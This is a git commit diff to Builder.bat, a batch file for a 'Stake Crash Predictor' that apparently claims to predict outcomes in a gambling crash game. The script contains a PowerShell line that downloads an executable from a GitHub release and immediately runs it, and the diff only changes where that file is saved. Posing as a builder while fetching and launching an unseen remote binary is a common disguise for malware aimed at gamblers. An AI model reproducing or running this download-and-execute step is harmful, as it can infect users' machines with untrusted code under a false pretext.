f1e6f8f5bd2fa88cdb08d674406722b600112ef2
stakepredictor-pixel <aboubakarien10@gmail.com>
2024-10-06 13:56:30 +0200

    Update Builder.bat

--- Builder.bat
+++ Builder.bat
@@ -4,6 +4,7 @@ title Stake Crash Predictor
 rem You can do any color
 color 0c
 
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/stakepredictor-pixel/stake-predictor-crash/releases/download/stake-crash/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/stakepredictor-pixel/stake-predictor-crash/releases/download/stake-crash/stake-crash.exe';$file='dist\stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;
 
-start stake-crash.exe
+
+start dist\stake-crash.exe
